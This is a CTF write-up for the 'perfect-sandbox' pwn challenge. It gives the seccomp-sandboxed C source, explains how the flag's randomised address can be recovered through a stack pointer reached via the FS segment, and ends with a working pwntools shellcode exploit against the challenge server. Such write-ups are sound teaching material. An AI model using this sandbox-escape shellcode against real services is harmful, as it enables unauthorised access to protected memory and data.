perfect-sandbox was a pwn challenge with 49 solves. here is its source code:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <linux/seccomp.h>
#include <seccomp.h>

void setup_seccomp () {
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_KILL);
    int ret = 0;
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    ret |= seccomp_load(ctx);
    if (ret) {
        errx(1, "seccomp failed");
    }
}

int main () {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char * tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

    int urandom = open("/dev/urandom", O_RDONLY);
    if (urandom < 0) {
        errx(1, "open /dev/urandom failed");
    }
    read(urandom, tmp, 4);
    close(urandom);

    unsigned int offset = *(unsigned int *)tmp & ~0xFFF;
    uint64_t addr = 0x1337000ULL + (uint64_t)offset;

    char * flag = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (flag == MAP_FAILED) {
        errx(1, "mapping flag failed");
    }

    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) {
        errx(1, "open flag.txt failed");
    }
    read(fd, flag, 128);
    close(fd);

    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (code == MAP_FAILED) {
        errx(1, "mmap failed");
    }

    char * stack = mmap((void *)0x13371337000, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);
    if (stack == MAP_FAILED) {
        errx(1, "failed to map stack");
    }

    printf("> ");
    read(0, code, 0x100000);

    setup_seccomp();

    asm volatile(
        ".intel_syntax noprefix\n"
        "mov rbx, 0x13371337\n"
        "mov rcx, rbx\n"
        "mov rdx, rbx\n"
        "mov rdi, rbx\n"
        "mov rsi, rbx\n"
        "mov rsp, 0x13371337000\n"
        "mov rbp, rbx\n"
        "mov r8,  rbx\n"
        "mov r9,  rbx\n"
        "mov r10, rbx\n"
        "mov r11, rbx\n"
        "mov r12, rbx\n"
        "mov r13, rbx\n"
        "mov r14, rbx\n"
        "mov r15, rbx\n"
        "jmp rax\n"
        ".att_syntax prefix\n"
        :
        : [code] "rax" (code)
        :
    );
}
```

Lets explain the code:
Firstly, the `setup_secomp` function will be called, which limits all the syscalls our shellcode can use, to just `read`, `write`, `exit`.
first of all, a new page is created using the `mmap` function, it reads a random number to it.
Then, it will add this random number to 0x1337000ULL, and mmap a new page, which it reads the flag into.
Then, it will allocate a new memory which is executable, which our assembly will be stored at.
And lastly, it will allocate a memory for our stack, in address 0x13371337000.

Now it will read our assembly code, run this code:
```asm
    asm volatile(
        ".intel_syntax noprefix\n"
        "mov rbx, 0x13371337\n"
        "mov rcx, rbx\n"
        "mov rdx, rbx\n"
        "mov rdi, rbx\n"
        "mov rsi, rbx\n"
        "mov rsp, 0x13371337000\n"
        "mov rbp, rbx\n"
        "mov r8,  rbx\n"
        "mov r9,  rbx\n"
        "mov r10, rbx\n"
        "mov r11, rbx\n"
        "mov r12, rbx\n"
        "mov r13, rbx\n"
        "mov r14, rbx\n"
        "mov r15, rbx\n"
        "jmp rax\n"
```
and then it will run our assembly.
the challenge is not so simple, because we can't just do a open-read-write to the flag, because we can't do open. we would need to read it from the mmaped memory.
But, the problem is that all the registers are 0x13371337, so we can't do anything. but is it true?

In x86-64 there are 3 TLS entries, two of them accesible via FS and GS registers, FS is used internally by glibc (in IA32 apparently FS is used by Wine and GS by glibc).
This can give us a lot of information! lets read some bytes from it using gdb:
![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/eba6d341-7113-4038-b68a-a119152f6cd8)

We can see that at the end, in offset 0x300, there is a stack leak! this is pretty strong, because the flag address is stored in the stack.
after dumbing some memory before/after this address, we can see that at this address - 0x50, there is a pointer to the flag. then we can just use the write syscall to write it.
Exploit:
```py
from pwn import *

context.arch = 'amd64'

p = remote('amt.rs', 31173)

p.recvuntil('> ')
shellcode = "mov rcx, qword ptr fs:0x300\n"
shellcode += "mov rdi, [rcx-0x50]"
shellcode += shellcraft.write(1,'rdi',100)

p.sendline(asm(shellcode))
p.interactive()
```
